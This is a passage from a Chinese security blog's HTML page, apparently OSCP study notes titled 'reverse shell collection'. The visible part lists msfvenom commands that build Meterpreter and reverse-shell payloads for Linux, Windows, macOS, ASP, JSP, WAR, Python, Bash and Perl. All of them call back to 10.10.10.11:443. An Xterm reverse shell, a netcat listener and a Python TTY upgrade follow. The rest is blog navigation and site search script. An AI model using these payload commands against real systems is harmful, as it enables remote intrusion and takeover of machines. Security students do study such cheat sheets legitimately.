linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f elf &gt; shell.elf</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f macho &gt; shell.macho</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f asp &gt; shell.asp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.jsp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f war &gt; shell.war</span><br><span class="line">msfvenom -p cmd/unix/reverse_python <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.py</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Xterm反弹shell"><a href="#使用Xterm反弹shell" class="headerlink" title="使用Xterm反弹shell"></a>使用Xterm反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xterm</span> -display <span class="number">10.10.10.11:1</span></span><br><span class="line"><span class="attribute">Xnest</span> :<span class="number">1</span></span><br><span class="line"><span class="attribute">xhost</span> +targetip</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取TTY"><a href="#获取TTY" class="headerlink" title="获取TTY"></a>获取TTY</h2><p>python</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md">https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md</a></p>
+
+      
+    </div>
+    
+    
+    
+	
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/images/wx_gongzhongh.jpg" alt=" wechat" style="width: 200px; max-width: 100%;"/>
+    <div>欢迎各位大佬关注团队公众号，求带！</div>
+</div>
+
+      </div>
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ax-x
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ax-x.github.io/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/" title="反弹shell合集">https://ax-x.github.io/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 学习笔记</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/" rel="next" title="word文档批量处理脚本">
+                <i class="fa fa-chevron-left"></i> word文档批量处理脚本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head_portrait.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ax-x" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bash%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9TCP%E5%8D%8F%E8%AE%AEshell"><span class="nav-number">1.</span> <span class="nav-text">Bash环境下反弹TCP协议shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bash%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9UDP%E5%8D%8F%E8%AE%AEshell"><span class="nav-number">2.</span> <span class="nav-text">Bash环境下反弹UDP协议shell:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Netcat%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.</span> <span class="nav-text">使用Netcat反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Ncat%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">使用Ncat反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8curl%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.</span> <span class="nav-text">利用curl反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Telnet%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">6.</span> <span class="nav-text">利用Telnet反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Socat%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.</span> <span class="nav-text">使用Socat反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="nav-number">8.</span> <span class="nav-text">利用Perl脚本反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">9.</span> <span class="nav-text">利用Python脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">10.</span> <span class="nav-text">利用PHP脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">11.</span> <span class="nav-text">利用Ruby脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8OpenSSL%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">12.</span> <span class="nav-text">使用OpenSSL反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win%E5%B9%B3%E5%8F%B0%E4%B8%8B%E4%BD%BF%E7%94%A8Powershell%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.</span> <span class="nav-text">win平台下使用Powershell反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Awk%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">14.</span> <span class="nav-text">利用Awk反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCL%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">15.</span> <span class="nav-text">TCL脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">16.</span> <span class="nav-text">Java版本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90War%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">17.</span> <span class="nav-text">生成War文件反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Lua%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">18.</span> <span class="nav-text">使用Lua脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NodeJS%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">19.</span> <span class="nav-text">NodeJS版本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Groovy%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">20.</span> <span class="nav-text">Groovy版本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90Meterpreter%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">21.</span> <span class="nav-text">生成Meterpreter反弹Shell:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Xterm%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">22.</span> <span class="nav-text">使用Xterm反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96TTY"><span class="nav-number">23.</span> <span class="nav-text">获取TTY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">24.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ax-x</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">38.5k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
